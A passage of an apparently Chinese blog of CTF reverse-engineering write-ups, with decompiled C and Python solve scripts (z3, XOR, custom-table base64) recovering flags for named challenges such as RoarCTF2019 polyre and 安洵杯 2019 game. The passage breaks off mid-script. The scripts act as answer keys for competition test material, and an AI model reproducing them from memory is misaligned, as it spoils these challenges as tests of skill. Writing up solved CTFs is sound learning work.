id="RoarCTF2019-polyre"><a href="#RoarCTF2019-polyre" class="headerlink" title="[RoarCTF2019]polyre"></a>[RoarCTF2019]polyre</h3><p>Ollvm + 不透明谓词 + 整数溢出</p><p>先去平坦化 <a target="_blank" rel="noopener" href="https://github.com/cq674350529/deflat%E5%90%8E%E5%8E%BB%E4%B8%8D%E9%80%8F%E6%98%8E%E8%B0%93%E8%AF%8D">https://github.com/cq674350529/deflat后去不透明谓词</a></p><p>流程如下</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v10 = <span class="number">0</span>;</span><br><span class="line"> <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line"> <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="keyword">sizeof</span>(s1));</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Input:&quot;</span>);</span><br><span class="line"> v11 = s;</span><br><span class="line"> __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, s);</span><br><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line"> &#123;</span><br><span class="line">   v12 = i;</span><br><span class="line">   v13 = i &lt; <span class="number">64</span>;</span><br><span class="line">   <span class="keyword">if</span> ( i &gt;= <span class="number">64</span> )</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   v14 = s[i];</span><br><span class="line">   v15 = v14;</span><br><span class="line">   <span class="keyword">if</span> ( v14 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     v16 = &amp;s[i];</span><br><span class="line">     *v16 = <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   v17 = i + <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">for</span> ( j = <span class="number">0</span>; ; ++j )</span><br><span class="line"> &#123;</span><br><span class="line">   v18 = j;</span><br><span class="line">   v19 = j &lt; <span class="number">6</span>;</span><br><span class="line">   <span class="keyword">if</span> ( j &gt;= <span class="number">6</span> )</span><br><span class="line">     <span class="keyword">break</span>;</span><br><span class="line">   v20 = s;</span><br><span class="line">   v4 = *(_QWORD *)&amp;s[<span class="number">8</span> * j];</span><br><span class="line">   <span class="keyword">for</span> ( k = <span class="number">0</span>; ; ++k )</span><br><span class="line">   &#123;</span><br><span class="line">     v21 = k;</span><br><span class="line">     v22 = k &lt; <span class="number">64</span>;</span><br><span class="line">     <span class="keyword">if</span> ( k &gt;= <span class="number">64</span> )</span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">     v23 = v4;</span><br><span class="line">     v24 = v4 &lt; <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">if</span> ( v4 &gt;= <span class="number">0</span> )</span><br><span class="line">     &#123;</span><br><span class="line">       v27 = v4;</span><br><span class="line">       v28 = <span class="number">2</span> * v4;</span><br><span class="line">       v4 *= <span class="number">2LL</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">       v25 = <span class="number">2</span> * v4;</span><br><span class="line">       v26 = <span class="number">2</span> * v4;</span><br><span class="line">       v4 = (<span class="number">2</span> * v4) ^ <span class="number">0xB0004B7679FA26B3</span>LL;</span><br><span class="line">     &#125;</span><br><span class="line">     v29 = k;</span><br><span class="line">   &#125;</span><br><span class="line">   v30 = <span class="number">8</span> * j;</span><br><span class="line">   v31 = &amp;s1[<span class="number">8</span> * j];</span><br><span class="line">   *(_QWORD *)v31 = v4;</span><br><span class="line">   v32 = j + <span class="number">1</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> v33 = <span class="built_in">memcmp</span>(s1, qword_402170, <span class="number">0x30</span>uLL);</span><br><span class="line"> v34 = v33 != <span class="number">0</span>;</span><br><span class="line"> <span class="keyword">if</span> ( v33 )</span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line"> <span class="keyword">else</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">&quot;Correct!&quot;</span>);</span><br><span class="line"> <span class="keyword">return</span> v10;</span><br></pre></td></tr></table></figure><p>将我们的输入数据转为有符号int64的v4</p><p>执行一个64次的循环, 循环内先判断v4的正负</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">v4 &gt; 0 则 v4 &lt;&lt; 1</span><br><span class="line">v4 &lt; 0 则 (v4 &lt;&lt; 1) ^ 0xB0004B7679FA26B3 </span><br></pre></td></tr></table></figure><p>我们无法判断左移前是正数还是负数，但注意到<code>v4 &lt;&lt; 1</code>为偶数, <code>(v4 &lt;&lt; 1) ^ 0xB0004B7679FA26B3</code>为奇数，则解密如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0xBC8FF26D43536296</span>, <span class="number">0x520100780530EE16</span>, <span class="number">0x4DC0B5EA935F08EC</span>, <span class="number">0x342B90AFD853F450</span>, <span class="number">0x8B250EBCAA2C3681</span>, <span class="number">0x55759F81A2C68AE4</span>]</span><br><span class="line"></span><br><span class="line">key = <span class="number">0xB0004B7679FA26B3</span></span><br><span class="line">flag = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">for</span> v <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">        p = v &amp; <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> p == <span class="number">1</span>:</span><br><span class="line">            v = (v ^ key) &gt;&gt; <span class="number">1</span></span><br><span class="line">            v = v | <span class="number">0x8000000000000000</span> <span class="comment"># 变成负数</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v = v &gt;&gt; <span class="number">1</span></span><br><span class="line">    <span class="comment"># print(hex(v))</span></span><br><span class="line">    flag += struct.pack(<span class="string">&quot;&lt;Q&quot;</span>, v)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="羊城杯-2020-login"><a href="#羊城杯-2020-login" class="headerlink" title="[羊城杯 2020]login"></a>[羊城杯 2020]login</h3><p>py打包的exe，<a target="_blank" rel="noopener" href="https://github.com/extremecoders-re/pyinstxtractor">extremecoders-re/pyinstxtractor: PyInstaller Extractor (github.com)</a>解包</p><p>uncomplye6 反编译, z3求解</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">code = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line">s = Solver()</span><br><span class="line">a1 = code[<span class="number">2</span>]</span><br><span class="line">a2 = code[<span class="number">1</span>]</span><br><span class="line">a3 = code[<span class="number">0</span>]</span><br><span class="line">a4 = code[<span class="number">3</span>]</span><br><span class="line">a5 = code[<span class="number">4</span>]</span><br><span class="line">a6 = code[<span class="number">5</span>]</span><br><span class="line">a7 = code[<span class="number">6</span>]</span><br><span class="line">a8 = code[<span class="number">7</span>]</span><br><span class="line">a9 = code[<span class="number">9</span>]</span><br><span class="line">a10 = code[<span class="number">8</span>]</span><br><span class="line">a11 = code[<span class="number">10</span>]</span><br><span class="line">a12 = code[<span class="number">11</span>]</span><br><span class="line">a13 = code[<span class="number">12</span>]</span><br><span class="line">a14 = code[<span class="number">13</span>]</span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + (a8 &lt;&lt; <span class="number">7</span>) - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    data = []</span><br><span class="line">    conditions = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code)):</span><br><span class="line">        data.append(m[code[i]].as_long())</span><br><span class="line">        conditions.append(code[i] != m[code[i]].as_long())</span><br><span class="line">    s.add(Or(conditions))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">        data[i-<span class="number">1</span>] ^= data[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br><span class="line">    <span class="built_in">print</span>(hashlib.md5(<span class="built_in">bytes</span>(data)).hexdigest())	</span><br></pre></td></tr></table></figure><h3 id="NPUCTF2020-你好sao啊"><a href="#NPUCTF2020-你好sao啊" class="headerlink" title="[NPUCTF2020]你好sao啊"></a>[NPUCTF2020]你好sao啊</h3><p>base64换表解密, 则我们先加密后替换即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">data = [<span class="number">0xFD370FEB59C9B9E</span>, <span class="number">0xDEAB7F029C4FD1B2</span>, <span class="number">0xFACD9D40E7636559</span>]</span><br><span class="line"></span><br><span class="line">data = struct.pack(<span class="string">&quot;&lt;3Q&quot;</span>, data[<span class="number">0</span>], data[<span class="number">1</span>], data[<span class="number">2</span>])</span><br><span class="line">flag = base64.b64encode(data)</span><br><span class="line"></span><br><span class="line">new_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234&#123;&#125;789+/&quot;</span></span><br><span class="line">old_table = <span class="string">b&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag.translate(<span class="built_in">bytes</span>.maketrans(old_table,new_table)))</span><br></pre></td></tr></table></figure><h3 id="UTCTF2020-babymips"><a href="#UTCTF2020-babymips" class="headerlink" title="[UTCTF2020]babymips"></a>[UTCTF2020]babymips</h3><p>IDA32打开，异或加密</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">data = [<span class="number">0x62</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0x76</span>, <span class="number">0x7A</span>, <span class="number">0x7B</span>, <span class="number">0x66</span>, <span class="number">0x73</span>, <span class="number">0x76</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x7D</span>, <span class="number">0x40</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x79</span>, <span class="number">0x40</span>, <span class="number">0x49</span>, <span class="number">0x47</span>, <span class="number">0x4D</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0x7B</span>, <span class="number">0x6A</span>, <span class="number">0x42</span>, <span class="number">0x0A</span>, <span class="number">0x4F</span>, <span class="number">0x52</span>, <span class="number">0x7D</span>, <span class="number">0x69</span>, <span class="number">0x4F</span>, <span class="number">0x53</span>, <span class="number">0x0C</span>, <span class="number">0x64</span>, <span class="number">0x10</span>, <span class="number">0x0F</span>, <span class="number">0x1E</span>, <span class="number">0x4A</span>, <span class="number">0x67</span>, <span class="number">0x03</span>, <span class="number">0x7C</span>, <span class="number">0x67</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0x31</span>, <span class="number">0x67</span>, <span class="number">0x61</span>, <span class="number">0x37</span>, <span class="number">0x7A</span>, <span class="number">0x62</span>, <span class="number">0x2C</span>, <span class="number">0x2C</span>, <span class="number">0x0F</span>, <span class="number">0x6E</span>, <span class="number">0x17</span>, <span class="number">0x00</span>, <span class="number">0x16</span>, <span class="number">0x0F</span>, <span class="number">0x16</span>, <span class="number">0x0A</span>, <span class="number">0x6D</span>, <span class="number">0x62</span>, <span class="number">0x73</span>, <span class="number">0x25</span>, <span class="number">0x39</span>, <span class="number">0x76</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0x63</span>, <span class="number">0x78</span>, <span class="number">0x2B</span>, <span class="number">0x74</span>, <span class="number">0x32</span>, <span class="number">0x16</span>, <span class="number">0x20</span>, <span class="number">0x22</span>, <span class="number">0x44</span>, <span class="number">0x19</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x4e</span>):</span><br><span class="line">    data[i] ^= (i + <span class="number">23</span>)</span><br><span class="line">    data[i] &amp;= <span class="number">0xff</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,data))))</span><br></pre></td></tr></table></figure><h3 id="安洵杯-2019-game"><a href="#安洵杯-2019-game" class="headerlink" title="[安洵杯 2019]game"></a>[安洵杯 2019]game</h3><p>ollvm + 数独， 先用deflat.py 去混淆</p><p>主函数中，对输入进行操作的如下图所示</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010165357023.png" alt="image-20211010165357023"></p><p>其他的可以动调得</p><p>check1主要加密逻辑分三步，第一步时把输入的前半与后半进行交换，第二步是两位两位交换，第三步是一个比较复杂的异或操作，直接z3即可。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010171608799.png" alt="image-20211010171608799"></p><p>check3中主要校验为check2</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010171747300.png" alt="image-20211010171747300"></p><p>则动调得到最终的sudoku, 通过对比得到v9再还原回去即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">sudoku = [<span class="number">0x00000001</span>, <span class="number">0x00000004</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000008</span>, <span class="number">0x00000003</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000007</span>, <span class="number">0x00000002</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000007</span>, <span class="number">0x00000003</span>, <span class="number">0x00000009</span>, <span class="number">0x00000005</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000003</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000002</span>, <span class="number">0x00000008</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000009</span>, <span class="number">0x00000008</span>, <span class="number">0x00000004</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000001</span>, <span class="number">0x00000002</span>, <span class="number">0x00000003</span>, <span class="number">0x00000005</span>, <span class="number">0x00000005</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000009</span>, <span class="number">0x00000003</span>, <span class="number">0x00000008</span>, <span class="number">0x00000007</span>, <span class="number">0x00000006</span>, <span class="number">0x00000004</span>]</span><br><span class="line"></span><br><span class="line">data = [<span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000004</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000002</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000006</span>, <span class="number">0x00000000</span>, <span class="number">0x00000005</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000008</span>, <span class="number">0x00000000</span>, <span class="number">0x00000009</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000000</span>, <span class="number">0x00000002</span>, <span class="number">0x00000001</span>, <span class="number">0x00000000</span>, <span class="number">0x00000003</span>, <span class="number">0x00000000</span>, <span class="number">0x00000007</span>, <span class="number">0x00000000</span>, <span class="number">0x00000004</span>]</span><br><span class="line"></span><br><span class="line">v9 = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(data, sudoku):</span><br><span class="line">    <span class="keyword">if</span> i != j:</span><br><span class="line">        v9.append(j)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">    v9[i] += <span class="number">0x30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">x = [BitVec(<span class="string">&#x27;x%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9))]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">    s.add((x[i] &amp; <span class="number">0xf3</span> | ~x[i] &amp; <span class="number">0xC</span>) - <span class="number">0x14</span> == v9[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s.check() == sat:</span><br><span class="line">    m = s.model()</span><br><span class="line">    data = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v9)):</span><br><span class="line">        data.append(m[x[i]].as_long())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data)-<span class="number">1</span>, <span class="number">2</span>):</span><br><span class="line">        data[i], data[i+<span class="number">1</span>] = data[i+<span class="number">1</span>], data[i]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)//<span class="number">2</span>):</span><br><span class="line">        data[i],data[<span class="built_in">len</span>(data)//<span class="number">2</span>+i] = data[<span class="built_in">len</span>(data)//<span class="number">2</span>+i], data[i]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(data))</span><br></pre></td></tr></table></figure><h3 id="GUET-CTF2019-encrypt"><a href="#GUET-CTF2019-encrypt" class="headerlink" title="[GUET-CTF2019]encrypt"></a>[GUET-CTF2019]encrypt</h3><p>rc4加密和换表base64加密</p><p>rc4主要就是异或加密，动调将异或的数打印出来即可</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010234711196.png" alt="image-20211010234711196"></p><p>这里下断点，其中edx即为异或的数据。写idapython脚本在断点处，将edx的值打印出来</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/Lantern-r/cdn_files/img/image-20211010234745319.png" alt="image-20211010234745319"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># from Crypto.Cipher import ARC4</span></span><br><span class="line">data = [<span class="number">0x5A</span>, <span class="number">0x60</span>, <span class="number">0x54</span>, <span class="number">0x7A</span>, <span class="number">0x7A</span>, <span class="number">0x54</span>, <span class="number">0x72</span>, <span class="number">0x44</span>, <span class="number">0x7C</span>, <span class="number">0x66</span>, <span class="number">0x51</span>, <span class="number">0x50</span>, <span class="number">0x5B</span>, <span class="number">0x5F</span>, <span class="number">0x56</span>, <span class="number">0x56</span>, <span class="number">0x4C</span>, <span class="number">0x7C</span>, <span class="number">0x79</span>, <span class="number">0x6E</span>, <span class="number">0x65</span>, <span class="number">0x55</span>, <span class="number">0x52</span>, <span class="number">0x79</span>, <span class="number">0x55</span>, <span class="number">0x6D</span>, <span class="number">0x46</span>, <span class="number">0x6B</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0x4A</span>, <span class="number">0x67</span>, <span class="number">0x4C</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x4A</span>, <span class="number">0x72</span>, <span class="number">0x6F</span>, <span 